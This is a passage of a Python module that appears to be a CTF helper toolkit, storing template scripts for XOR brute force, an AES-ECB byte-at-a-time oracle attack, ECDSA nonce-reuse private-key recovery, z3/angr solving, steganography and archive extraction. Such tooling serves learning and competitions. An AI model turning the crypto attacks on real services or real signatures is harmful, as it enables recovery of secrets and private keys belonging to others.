        print("[-] Could not parse input as hex or base64.")
        return

    print(f"[*] Target length: {len(ct_bytes)} bytes")
    print(f"[*] Searching for pattern: '{args.pattern}'")
    
    results = []
    
    # Bruteforce all 256 keys
    for key in range(256):
        pt_bytes = single_byte_xor(ct_bytes, key)
        
        try:
            pt_str = pt_bytes.decode('utf-8', errors='ignore')
            
            # If pattern is found, it's highly likely the correct key
            if args.pattern in pt_str:
                print(f"\\n[+++] EXACT MATCH FOUND [+++]")
                print(f"Key : {hex(key)} ({key})")
                print(f"Text: {pt_str}")
                return
                
            score = score_text(pt_bytes)
            # Only keep results where mostly printable characters were recovered
            if score > len(pt_bytes) * 0.8:
                results.append((score, key, pt_str))
                
        except Exception:
            continue
            
    # If no exact match, show top 5 scoring results
    if results:
        print("\\n[-] No exact pattern match, showing top 5 printable results:")
        results.sort(reverse=True, key=lambda x: x[0])
        for score, key, text in results[:5]:
             print(f"Key: {hex(key):<5} Score: {score}/{len(ct_bytes)}  Text: {text[:50]}...")
    else:
        print("[-] No meaningful results found.")

if __name__ == "__main__":
    main()
'''
        },
        "aes_ecb_oracle": {
            "description": "Exploit skeleton for AES ECB Byte-at-a-time (Oracle) attacks.",
            "content": '''#!/usr/bin/env python3
"""
AES ECB Oracle Byte-at-a-time Attacker
Exploit skeleton for recovering a hidden flag when appended to user input and encrypted via ECB.
Modify `oracle_encrypt` to interact with your local/remote target.
"""
import string
import binascii
from pwn import *

BLOCK_SIZE = 16
KNOWN_PREFIX = b"flag{"

# Set up connection if remote
# io = remote("target", 1337)

def oracle_encrypt(plaintext: bytes) -> bytes:
    """
    Send plaintext to the oracle and return the ciphertext.
    The oracle should be performing: AES_ECB(plaintext + hidden_secret)
    """
    # --- PWNTOOLS REMOTE EXAMPLE ---
    # io.recvuntil(b"Enter plaintext: ")
    # io.sendline(plaintext.hex().encode())
    # ciphertext_hex = io.recvline().strip()
    # return bytes.fromhex(ciphertext_hex.decode())
    
    # Placeholder return
    return b'A' * BLOCK_SIZE * 2

def exploit():
    print(f"[*] Starting ECB Byte-at-a-time attack...")
    extracted = KNOWN_PREFIX
    
    # We assume we don't know the exact length, but we stop when padding exceptions occur or we see '}'
    while True:
        # 1. Craft the block boundary payload
        # e.g., if we know 5 bytes ("flag{"), we need 15 bytes of 'A' to leave 1 byte of the secret in the first block
        target_len = (BLOCK_SIZE - 1) - (len(extracted) % BLOCK_SIZE)
        padding = b'A' * target_len
        
        # 2. Get the target ciphertext block
        target_ct = oracle_encrypt(padding)
        
        # We compare the block where our target byte falls
        block_index = len(extracted) // BLOCK_SIZE
        start_idx = block_index * BLOCK_SIZE
        end_idx = start_idx + BLOCK_SIZE
        target_block = target_ct[start_idx:end_idx]
        
        # 3. Brute force the last byte
        found = False
        for c in range(256):
            test_byte = bytes([c])
            test_payload = padding + extracted + test_byte
            
            test_ct = oracle_encrypt(test_payload)
            test_block = test_ct[start_idx:end_idx]
            
            if test_block == target_block:
                extracted += test_byte
                print(f"\\r[+] Extracted: {extracted.decode('latin-1', 'replace')}", end="", flush=True)
                found = True
                if test_byte == b'}':
                    print("\\n[*] Reached end of flag!")
                    return extracted
                break
                
        if not found:
            print(f"\\n[-] Could not find next byte. Extracted so far: {extracted}")
            break
            
    return extracted

if __name__ == "__main__":
    result = exploit()
    print(f"\\n[+] Final Secret: {result}")
'''
        },
        "ecdsa_nonce_reuse": {
            "description": "ECDSA nonce reuse attack to recover private key.",
            "content": '''#!/usr/bin/env python3
"""
ECDSA Nonce Reuse Attack
Recovers the private key when the same nonce (k) is used for two signatures.
Requires: pip install pycryptodome
"""
import argparse
from Crypto.Util.number import inverse, GCD

def recover_key(r, s1, s2, z1, z2, n):
    """
    Recover private key from two signatures with same nonce.
    r, s1, s2: signature values (same r means same k)
    z1, z2: message hashes
    n: curve order
    """
    # k = (z1 - z2) / (s1 - s2) mod n
    k = ((z1 - z2) * inverse(s1 - s2, n)) % n
    
    # private_key = (s * k - z) / r mod n
    private_key = ((s1 * k - z1) * inverse(r, n)) % n
    
    return private_key, k

def main():
    parser = argparse.ArgumentParser(description="ECDSA Nonce Reuse Attack")
    parser.add_argument("-r", type=lambda x: int(x, 0), required=True, help="r value (same for both signatures)")
    parser.add_argument("-s1", type=lambda x: int(x, 0), required=True, help="s1 value (first signature)")
    parser.add_argument("-s2", type=lambda x: int(x, 0), required=True, help="s2 value (second signature)")
    parser.add_argument("-z1", type=lambda x: int(x, 0), required=True, help="z1 value (hash of first message)")
    parser.add_argument("-z2", type=lambda x: int(x, 0), required=True, help="z2 value (hash of second message)")
    parser.add_argument("-n", type=lambda x: int(x, 0), required=True, help="Curve order (for secp256k1: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)")
    args = parser.parse_args()
    
    print("[*] Attempting ECDSA nonce reuse attack...")
    
    try:
        private_key, k = recover_key(args.r, args.s1, args.s2, args.z1, args.z2, args.n)
        
        print(f"[+] Recovered private key: {hex(private_key)}")
        print(f"[+] Nonce (k): {hex(k)}")
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        print("[-] Make sure the same nonce was used for both signatures!")

if __name__ == '__main__':
    main()
'''
        }
    },
    "Reverse": {
        "z3_solver": {
            "description": "Z3 Theorem Prover skeleton for reverse engineering and constraint solving.",
            "content": '''#!/usr/bin/env python3
"""
Z3 Solver Skeleton
A template for solving equation systems or reverse engineering constraints using z3-solver.
Requires: pip install z3-solver
Usage: python z3_solver.py
"""
import sys
try:
    from z3 import *
except ImportError:
    print("[-] Error: 'z3-solver' not installed. Run: pip install z3-solver")
    sys.exit(1)

def main():
    print("[*] Initializing Z3 Solver...")
    s = Solver()

    # 1. Define symbolic variables (Example: 4 characters for a flag part)
    # Using BitVec for bitwise operations, or Int for pure math.
    chars = [BitVec(f"c_{i}", 8) for i in range(4)]

    # 2. Add constraints (Example: Printable ASCII)
    for c in chars:
        s.add(c >= 32, c <= 126)
        
    # 3. Add challenge-specific constraints
    # Example constraints (replace with actual reversing findings)
    # s.add(chars[0] ^ 0x5a == 0x3c)
    # s.add(chars[1] + chars[2] == 150)
    # s.add(chars[3] == ord('}'))
    
    print("[*] Constraints added. Checking satisfiability...")
    
    # 4. Check if a solution exists
    if s.check() == sat:
        print("\\n[+] Solution found (sat)!")
        model = s.model()
        
        # 5. Extract and print the flag
        flag = ""
        for c in chars:
            # model[c].as_long() gets the concrete value
            val = model[c]
            if val is not None:
                flag += chr(val.as_long())
            else:
                flag += "?"
                
        print(f"[+] Recovered String: {flag}")
    else:
        print("\\n[-] Unsat! No solution exists for these constraints.")

if __name__ == '__main__':
    main()
'''
        },
        "angr_symbolic_exec": {
            "description": "Angr symbolic execution template for automated binary analysis.",
            "content": '''#!/usr/bin/env python3
"""
Angr Symbolic Execution Template
Automates finding paths to success conditions in binaries.
Requires: pip install angr
"""
import angr
import sys

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary_path>")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    
    print(f"[*] Loading binary: {binary_path}")
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # Create symbolic state at entry point
    state = proj.factory.entry_state()
    
    # Create symbolic stdin
    # flag = claripy.BVS('flag', 8 * 32)  # 32-byte flag
    # state.posix.stdin.store(0, flag)
    
    # Create simulation manager
    simgr = proj.factory.simulation_manager(state)
    
    # Define success and failure conditions
    # Example: Find path that prints "Correct!"
    # FIND_ADDR = 0x401234  # Address of success message
    # AVOID_ADDR = 0x401250  # Address of failure message
    
    # Run symbolic execution
    print("[*] Running symbolic execution...")
    # simgr.explore(find=FIND_ADDR, avoid=AVOID_ADDR)
    
    # Or use lambda for more complex conditions
    # simgr.explore(find=lambda s: b"Correct" in s.posix.dumps(1))
    
    # For demo, just run until we find any solution
    simgr.run()
    
    if simgr.found:
        print(f"[+] Found {len(simgr.found)} solutions!")
        
        for i, found_state in enumerate(simgr.found):
            print(f"\\n[Solution {i+1}]")
            # Get stdin that led to this state
            solution = found_state.posix.dumps(0)
            print(f"Input: {solution}")
            
            # If you used symbolic variables, constrain and evaluate them
            # flag_value = found_state.solver.eval(flag, cast_to=bytes)
            # print(f"Flag: {flag_value}")
    else:
        print("[-] No solutions found!")

if __name__ == '__main__':
    main()
'''
        }
    },
    "Stego": {
        "lsb_extract": {
            "description": "Extract Least Significant Bits (LSB) from PNG/BMP images.",
            "content": '''#!/usr/bin/env python3
"""
LSB (Least Significant Bit) Extractor
Extracts the LSB from image pixels to uncover hidden messages.
Requires: pip install Pillow
Usage: python lsb_extract.py <image_file> [--channel R|G|B|ALL]
"""
import argparse
import sys
try:
    from PIL import Image
except ImportError:
    print("[-] Error: 'Pillow' not installed. Run: pip install Pillow")
    sys.exit(1)

def extract_lsb(image_path, channel):
    try:
        img = Image.open(image_path)
        img = img.convert('RGB')
    except Exception as e:
        print(f"[-] Could not open image: {e}")
        return

    pixels = img.load()
    width, height = img.size
    
    print(f"[*] Image loaded: {width}x{height} pixels")
    print(f"[*] Extracting LSB from channel: {channel}")
    
    binary_data = ""
    
    # Iterate over all pixels
    for y in range(height):
        for x in range(width):
            r, g, b = pixels[x, y]
            
            if channel in ('R', 'ALL'):
                binary_data += str(r & 1)
            if channel in ('G', 'ALL'):
                binary_data += str(g & 1)
            if channel in ('B', 'ALL'):
                binary_data += str(b & 1)
                
    # Convert binary string to bytes
    print("[*] Extraction complete. Converting binary to ascii...")
    byte_array = bytearray()
    
    for i in range(0, len(binary_data), 8):
        byte = binary_data[i:i+8]
        if len(byte) == 8:
            byte_array.append(int(byte, 2))
            
    # Try to decode to string and find something interesting
    try:
        ascii_text = byte_array.decode('ascii', errors='ignore')
        print("\\n[+] Extracted ASCII Preview (First 500 chars):")
        print("-" * 40)
        # Filter for printable chars mostly
        printable = "".join([c if 32 <= ord(c) <= 126 or c in ('\\n', '\\r') else '.' for c in ascii_text[:500]])
        print(printable)
        print("-" * 40)
        
        if 'flag{' in ascii_text.lower():
            print("\\n[+++] POSSIBLE FLAG FOUND in data! [+++]")
            
    except Exception as e:
        print(f"[-] Error displaying ascii: {e}")

    # Optional: Save raw bytes to file
    out_file = f"lsb_extracted_{channel}.bin"
    with open(out_file, "wb") as f:
        f.write(byte_array)
    print(f"[+] Raw extracted bytes saved to {out_file}")

def main():
    parser = argparse.ArgumentParser(description="LSB Extractor for Steganography")
    parser.add_argument("image", help="Path to the image file (png, bmp, etc)")
    parser.add_argument("--channel", choices=["R", "G", "B", "ALL"], default="ALL", 
                        help="Color channel to extract from (default: ALL)")
    
    args = parser.parse_args()
    extract_lsb(args.image, args.channel)

if __name__ == "__main__":
    main()
'''
        },
        "image_header_analyzer": {
            "description": "Analyze and repair corrupted image headers (PNG/JPEG).",
            "content": '''#!/usr/bin/env python3
"""
Image Header Analyzer and Repair Tool
Checks for corrupted image headers and attempts basic repairs.
"""
import argparse
import sys

PNG_HEADER = b'\\x89PNG\\r\\n\\x1a\\n'
JPEG_HEADER = b'\\xff\\xd8\\xff'
GIF_HEADER = b'GIF89a'

def analyze_file(file_path):
    """Analyze file header and detect issues."""
    with open(file_path, 'rb') as f:
        data = f.read()
    
    print(f"[*] File size: {len(data)} bytes")
    print(f"[*] First 16 bytes (hex): {data[:16].hex()}")
    print(f"[*] First 16 bytes (ascii): {data[:16]}")
    
    # Check for known formats
    if data[:8] == PNG_HEADER:
        print("[+] Valid PNG header detected")
        return 'PNG', data
    elif data[:3] == JPEG_HEADER:
        print("[+] Valid JPEG header detected")
        return 'JPEG', data
    elif data[:6] == GIF_HEADER:
        print("[+] Valid GIF header detected")
        return 'GIF', data
    else:
        print("[-] Unknown or corrupted header")
        
        # Try to find embedded headers
        png_offset = data.find(PNG_HEADER)
        jpeg_offset = data.find(JPEG_HEADER)
        
        if png_offset != -1:
            print(f"[*] PNG header found at offset {png_offset}")
            return 'PNG_CORRUPTED', data[png_offset:]
        elif jpeg_offset != -1:
            print(f"[*] JPEG header found at offset {jpeg_offset}")
            return 'JPEG_CORRUPTED', data[jpeg_offset:]
        
        return None, data

def repair_file(file_path, output_path):
    """Attempt to repair the file."""
    file_type, data = analyze_file(file_path)
    
    if file_type and 'CORRUPTED' in file_type:
        print(f"[*] Attempting to repair as {file_type.split('_')[0]}...")
        
        with open(output_path, 'wb') as f:
            f.write(data)
        
        print(f"[+] Repaired file saved to: {output_path}")
    elif file_type:
        print("[*] File appears valid, no repair needed")
    else:
        print("[-] Could not repair file automatically")

def main():
    parser = argparse.ArgumentParser(description="Image Header Analyzer")
    parser.add_argument("file", help="Image file to analyze")
    parser.add_argument("-r", "--repair", help="Output path for repaired file")
    args = parser.parse_args()
    
    if args.repair:
        repair_file(args.file, args.repair)
    else:
        analyze_file(args.file)

if __name__ == '__main__':
    main()
'''
        }
    },
    "Misc": {
        "nested_extractor": {
            "description": "Extracts deeply nested zip/tar archives iteratively.",
            "content": '''#!/usr/bin/env python3

            
"""
Nested Archive Extractor
Extracts zip and tar files repeatedly until no more archives are found.
Usage: python nested_extractor.py <archive_file>
"""
import sys
import os
import zipfile
import tarfile
import shutil

def extract_all(start_file):
    current_file = start_file
    iteration = 0
    
    while True:
        iteration += 1
        print(f"[*] Iteration {iteration}: Extracting {current_file}...")
        
        extracted_files = []
        
        if zipfile.is_zipfile(current_file):
            with zipfile.ZipFile(current_file, 'r') as z:
                extracted_files = z.namelist()
                z.extractall()
        elif tarfile.is_tarfile(current_file):
            with tarfile.open(current_file, 'r') as t:
                extracted_files = t.getnames()
                t.extractall()
        else:
            print(f"[+] Extraction complete. Final file: {current_file}")
            break
            
        # Try to find the next archive
        next_archive = None
        for f in extracted_files:
            if zipfile.is_zipfile(f) or tarfile.is_tarfile(f):
                next_archive = f
                break
                
        # Remove the previous archive if it's not the original one
        if current_file != start_file:
            os.remove(current_file)
            
        if next_archive:
            current_file = next_archive
        else:
            print(f"[+] Extraction complete. Contents: {extracted_files}")
            break

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <archive_file>")
        sys.exit(1)
        
    start_file = sys.argv[1]
    if not os.path.exists(start_file):
        print(f"[-] File not found: {start_file}")
        sys.exit(1)
        
    extract_all(start_file)
'''
        },
        "qr_decoder": {
            "description": "Decode and analyze QR codes from images.",
            "content": '''#!/usr/bin/env python3
"""
QR Code Decoder
Decodes QR codes from image files.
Requires: pip install opencv-python pyzbar pillow
"""
import sys
import argparse

try:
    from PIL import Image
    from pyzbar.pyzbar import decode
    import cv2
except ImportError:
    print("[-] Missing dependencies. Install with:")
    print("    pip install opencv-python pyzbar pillow")
    sys.exit(1)

def decode_qr(image_path):
    """Decode QR code from image."""
    print(f"[*] Loading image: {image_path}")
    
    # Try with PIL first
    img = Image.open(image_path)
    decoded = decode(img)
    
    if decoded:
        print(f"[+] Found {len(decoded)} QR code(s):\\n")
        for i, obj in enumerate(decoded):
            print(f"QR Code {i+1}:")
            print(f"  Type: {obj.type}")
            print(f"  Data: {obj.data.decode('utf-8', errors='ignore')}")
            print(f"  Raw Data (hex): {obj.data.hex()}")
            print()
    else:
        print("[-] No QR codes found in image")
        print("[*] Trying with enhanced preprocessing...")
        
        # Try OpenCV preprocessing
        img_cv = cv2.imread(image_path)
        gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
        
        # Try different thresholding
        _, thresh = cv2.threshold(gray, 127, 255, cv2.THRESH_BINARY)
        decoded = decode(Image.fromarray(thresh))
        
        if decoded:
            print("[+] QR code found after preprocessing!")
            for obj in decoded:
                print(f"Data: {obj.data.decode('utf-8', errors='ignore')}")
        else:
            print("[-] Still no QR code found")

def main():
    parser = argparse.ArgumentParser(description="QR Code Decoder")
    parser.add_argument("image", help="Path to image containing QR code")
    args = parser.parse_args()
    
    decode_qr(args.image)

if __name__ == '__main__':
    main()
'''
        },
        "base_converter": {
            "description": "Multi-base encoding/decoding tool (base64, base32, hex, binary).",
            "content": '''#!/usr/bin/env python3
"""
Multi-Base Converter
Converts between various encoding schemes: base64, base32, hex, binary.
"""
import argparse
import base64
import binascii

def auto_detect_and_decode(data):
    """Try to automatically detect encoding and decode."""
    results = []
    
    # Try Base64
    try:
        decoded = base64.b64decode(data)
        if all(32 <= b <= 126 or b in (9, 10, 13) for b in decoded):
            results.append(('Base64', decoded.decode('utf-8', errors='ignore')))
    except:
        pass
    
    # Try Base32
    try:
        decoded = base64.b32decode(data)
        if all(32 <= b <= 126 or b in (9, 10, 13) for b in decoded):
            results.append(('Base32', decoded.decode('utf-8', errors='ignore')))
    except:
        pass
    
    # Try Hex
    try:
        decoded = bytes.fromhex(data)
        if all(32 <= b <= 126 or b in (9, 10, 13) for b in decoded):
            results.append(('Hex', decoded.decode('utf-8', errors='ignore')))
    except:
        pass
    
    # Try Binary (groups of 8)
    try:
        data_clean = data.replace(' ', '')
        if all(c in '01' for c in data_clean):
            decoded = int(data_clean, 2).to_bytes((len(data_clean) + 7) // 8, 'big')
            if all(32 <= b <= 126 or b in (9, 10, 13) for b in decoded):
                results.append(('Binary', decoded.decode('utf-8', errors='ignore')))
    except:
        pass
    
    return results

def encode_data(data, encoding):
    """Encode data with specified encoding."""
    data_bytes = data.encode('utf-8')
    
    if encoding == 'base64':
        return base64.b64encode(data_bytes).decode()
    elif encoding == 'base32':
        return base64.b32encode(data_bytes).decode()
    elif encoding == 'hex':
        return data_bytes.hex()
    elif encoding == 'binary':
        return ' '.join(format(b, '08b') for b in data_bytes)

def main():
    parser = argparse.ArgumentParser(description="Multi-Base Converter")
    parser.add_argument("data", help="Data to encode/decode")
    parser.add_argument("-d", "--decode", action='store_true', help="Decode mode (auto-detect)")
    parser.add_argument("-e", "--encode", choices=['base64', 'base32', 'hex', 'binary'], help="Encode with specified format")
    args = parser.parse_args()
    
    if args.decode:
        results = auto_detect_and_decode(args.data)
        if results:
            print("[+] Possible decodings:")
            for encoding, decoded in results:
                print(f"\\n{encoding}:")
                print(f"  {decoded}")
        else:
            print("[-] Could not decode with any known encoding")
    
    elif args.encode:
        encoded = encode_data(args.data, args.encode)
        print(f"[+] {args.encode.upper()} encoded:")
        print(encoded)
    
    else:
        print("[-] Please specify --decode or --encode")

if __name__ == '__main__':
    main()
'''
        }
    }
}

def generate_script(script_name: str, dest_dir: Path) -> Path:
    """
    Generate a script by name in the target directory.
    
    Args:
        script_name: The name of the script to generate (e.g. 'rsa_basic').
        dest_dir: The directory where the script will be saved.
        
    Returns:
        Path to the generated script file.
        
    Raises:
        ValueError: If the script name is not found.
    """
    # Search for the script across all categories
    script_content = None
    for category, scripts in SCRIPTS.items():
        if script_name in scripts:
            script_content = scripts[script_name]["content"]
            break
            
    if script_content is None:
        raise ValueError(f"Script '{script_name}' not found.")
        
    file_path = dest_dir / f"{script_name}.py"
    
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(script_content)
        
    # Make executable on Unix-like systems
    try:
        file_path.chmod(0o755)
    except Exception as e:
        logger.warning(f"Could not make script executable: {e}")
        
    return file_path

def get_available_scripts() -> dict:
    """
    Return a categorized dictionary of available scripts and their descriptions.
    Format: {"Category": {"script_name": "description"}}
    """
    result = {}
    for category, scripts in SCRIPTS.items():
        result[category] = {name: info["description"] for name, info in scripts.items()}
    return result

